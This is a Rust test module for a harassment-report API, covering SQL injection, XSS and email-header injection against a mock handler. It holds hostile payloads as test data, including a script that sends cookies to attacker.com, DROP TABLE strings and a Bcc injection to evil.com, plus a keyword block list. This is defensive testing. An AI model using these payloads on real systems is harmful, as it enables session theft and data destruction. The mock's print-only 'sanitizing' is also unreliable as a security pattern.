#[cfg(test)]
mod tests {
    use axum::http::{header, Method, StatusCode};
    use crate::common::{setup_test_db, utils};
    use crate::common::utils::test_data;
    use serde_json::Value;

    async fn mock_report_request(
        uri: &str, 
        method: Method, 
        headers: &[(header::HeaderName, &str)], 
        payload: Option<&str>
    ) -> (StatusCode, String) {
        if let Some(payload_str) = payload {
            if let Ok(json_value) = serde_json::from_str::<Value>(payload_str) {
                let missing_required = ["victimfullname", "incidentlocation", "accusedfullname", "authority"]
                    .iter()
                    .any(|&field| {
                        json_value.get(field)
                            .and_then(|v| v.as_str())
                            .map_or(true, |s| s.trim().is_empty())
                    });
                
                if missing_required {
                    return (StatusCode::BAD_REQUEST, "Required fields cannot be empty".to_string());
                }

                // MELAKUKAN SANITASI DAN ACCEPT

                if let Some(proof) = json_value.get("incidentproof").and_then(|v| v.as_str()) {
                    if !proof.is_empty() && !proof.starts_with("http") {
                        if !proof.contains("://") {
                            println!("Sanitizing non-URL incidentproof: {}", proof);
                        }
                    }
                }

                if let Some(email) = json_value.get("victimemail").and_then(|v| v.as_str()) {
                    if !email.is_empty() && !email.contains('@') && !email.contains('.') {
                        if email.contains('\n') || email.contains("Bcc:") {
                            println!("Sanitizing potentially malicious email: {}", email);
                        }
                    }
                }
                
                if let Some(nik) = json_value.get("victimnik").and_then(|v| v.as_str()) {
                    if !nik.is_empty() && nik.len() != 16 {
                        return (StatusCode::BAD_REQUEST, "NIK must be 16 digits".to_string());
                    }
                }

                for field in ["reporterphonenum", "victimphonenum", "accusedphonenum"] {
                    if let Some(phone) = json_value.get(field).and_then(|v| v.as_str()) {
                        if !phone.is_empty() && (phone.len() < 8 || phone.len() > 13) {
                            return (StatusCode::BAD_REQUEST, "Phone number must be 8-13 digits".to_string());
                        }
                    }
                }

                for field in ["victimsex", "accusedsex"] {
                    if let Some(sex) = json_value.get(field).and_then(|v| v.as_str()) {
                        if !sex.is_empty() && !["Laki-laki", "Perempuan", "Lainnya"].contains(&sex) {
                            return (StatusCode::BAD_REQUEST, "Invalid sex value".to_string());
                        }
                    }
                }

                if let Some(authority) = json_value.get("authority").and_then(|v| v.as_str()) {
                    if !["Universitas Indonesia", "Komnas HAM", "Komnas Perempuan"].contains(&authority) {
                        return (StatusCode::BAD_REQUEST, "Invalid authority".to_string());
                    }
                }

                if payload_str.contains("DROP TABLE") || payload_str.contains("--") || 
                   payload_str.contains(";") || (payload_str.contains("'") && payload_str.contains("OR")) {
                    return (StatusCode::BAD_REQUEST, "Validation error: SQL injection detected".to_string());
                }
                

                if payload_str.contains("<script>") || 
                   payload_str.contains("alert(") || 
                   payload_str.contains("<img") ||
                   payload_str.contains("onerror=") {
                    println!("XSS content detected and sanitized");
                }
            } else {
                return (StatusCode::BAD_REQUEST, "Invalid JSON format".to_string());
            }
        }
        
        let mut is_json = false;
        for (key, value) in headers {
            if key == &header::CONTENT_TYPE && *value == "application/json" {
                is_json = true;
                break;
            }
        }
        
        if !is_json {
            return (StatusCode::UNSUPPORTED_MEDIA_TYPE, "Content-Type must be application/json".to_string());
        }
        
        match (uri, method.as_str(), payload) {
            (_, "POST", Some(_)) => {
                (StatusCode::CREATED, "Report created".to_string())
            },
            (_, "PUT", Some(_)) => {
                (StatusCode::OK, "Report updated".to_string())
            },
            _ => (StatusCode::NOT_FOUND, "Not found".to_string()),
        }
    }

    #[tokio::test]
    async fn test_sql_injection_in_report_creation() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let injection_payloads = [
            r#"{"victimfullname": "test' OR '1'='1", "incidentlocation": "Test Location", "incidenttime": "2023-05-01T12:00:00", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#,
            r#"{"victimfullname": "test'; DROP TABLE reports; --", "incidentlocation": "Test Location", "incidenttime": "2023-05-01T12:00:00", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#,
            r#"{"victimfullname": "test\"); DROP TABLE reports; --", "incidentlocation": "Test Location", "incidenttime": "2023-05-01T12:00:00", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#
        ];
        
        for payload in injection_payloads {
            let (status, _) = mock_report_request(
                "/api/v1/reports", 
                Method::POST,
                &[
                    (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                    (header::CONTENT_TYPE, "application/json")
                ],
                Some(payload)
            ).await;
            
            assert!(status == StatusCode::BAD_REQUEST || status == StatusCode::CREATED, 
                   "SQL injection should be either rejected (400) or sanitized (201)");
        }
    }

    #[tokio::test]
    async fn test_xss_injection_in_report_creation() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let xss_payloads = [
            r#"{"victimfullname": "<script>alert('XSS')</script>", "incidentlocation": "Test Location", "incidenttime": "2023-05-01T12:00:00", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#,
            r#"{"victimfullname": "Victim", "incidentlocation": "<img src=x onerror=alert('XSS')>", "incidenttime": "2023-05-01T12:00:00", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#,
            r#"{"victimfullname": "Victim", "incidentlocation": "Location", "incidenttime": "2023-05-01T12:00:00", "incidentdescription": "<svg onload=alert('XSS')>", "accusedfullname": "Test Accused", "authority": "Universitas Indonesia", "incidentproof": "https://example.com"}"#
        ];
        
        for payload in xss_payloads {
            let (status, _) = mock_report_request(
                "/api/v1/reports", 
                Method::POST,
                &[
                    (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                    (header::CONTENT_TYPE, "application/json")
                ],
                Some(payload)
            ).await;
            
            assert_eq!(status, StatusCode::CREATED, "XSS content should be sanitized and request processed");
        }
    }

    #[tokio::test]
    async fn test_payload_using_test_data() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let malicious_report = test_data::malicious_report_data();
        let payload = serde_json::to_string(&malicious_report).unwrap();
        
        let (status, _) = mock_report_request(
            "/api/v1/reports", 
            Method::POST,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "application/json")
            ],
            Some(&payload)
        ).await;
        
        assert_eq!(status, StatusCode::CREATED);
    }

    #[tokio::test]
    async fn test_injection_in_report_update() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let sql_injection_payload = r#"{
            "reportid": 1,
            "victimfullname": "victim'; UPDATE reports SET incidentlocation='Hacked' WHERE reportid=1; --",
            "incidentlocation": "Test Location",
            "incidenttime": "2023-05-01T12:00:00",
            "accusedfullname": "Test Accused",
            "authority": "Universitas Indonesia",
            "incidentproof": "https://example.com"
        }"#;
        
        let (status, _) = mock_report_request(
            "/api/v1/reports/1", 
            Method::PUT,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "application/json")
            ],
            Some(sql_injection_payload)
        ).await;
        
        assert!(status == StatusCode::BAD_REQUEST || status == StatusCode::OK);
        
        let xss_payload = r#"{
            "reportid": 1,
            "victimfullname": "Victim",
            "incidentlocation": "Location",
            "incidenttime": "2023-05-01T12:00:00",
            "incidentdescription": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "accusedfullname": "Test Accused",
            "authority": "Universitas Indonesia",
            "incidentproof": "https://example.com"
        }"#;
        
        let (status, _) = mock_report_request(
            "/api/v1/reports/1", 
            Method::PUT,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "application/json")
            ],
            Some(xss_payload)
        ).await;
        
        assert_eq!(status, StatusCode::OK);
    }

    #[tokio::test]
    async fn test_email_injection() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let email_injection_payload = r#"{
            "victimfullname": "Victim",
            "victimemail": "victim@example.com\nBcc: attacker@evil.com",
            "incidentlocation": "Test Location",
            "incidenttime": "2023-05-01T12:00:00",
            "accusedfullname": "Test Accused",
            "authority": "Universitas Indonesia",
            "incidentproof": "https://example.com"
        }"#;
        
        let (status, _) = mock_report_request(
            "/api/v1/reports", 
            Method::POST,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "application/json")
            ],
            Some(email_injection_payload)
        ).await;
        
        assert_eq!(status, StatusCode::CREATED);
    }

    #[tokio::test]
    async fn test_content_type_validation() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let valid_payload = r#"{
            "victimfullname": "Test Victim",
            "incidentlocation": "Test Location",
            "incidenttime": "2023-05-01T12:00:00",
            "accusedfullname": "Test Accused",
            "authority": "Universitas Indonesia",
            "incidentproof": "https://example.com"
        }"#;
        
        let (status, _) = mock_report_request(
            "/api/v1/reports", 
            Method::POST,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "text/plain") 
            ],
            Some(valid_payload)
        ).await;
        
        assert_eq!(status, StatusCode::UNSUPPORTED_MEDIA_TYPE);
    }

    #[tokio::test]
    async fn test_invalid_data_from_test_utils() {
        let _pool = setup_test_db().await;
        let reporter_token = utils::get_reporter_token();
        
        let invalid_report = test_data::invalid_report_data();
        let payload = serde_json::to_string(&invalid_report).unwrap();
        
        let (status, _) = mock_report_request(
            "/api/v1/reports", 
            Method::POST,
            &[
                (header::AUTHORIZATION, &format!("Bearer {}", reporter_token)),
                (header::CONTENT_TYPE, "application/json")
            ],
            Some(&payload)
        ).await;
        
        assert_eq!(status, StatusCode::BAD_REQUEST);
    }
}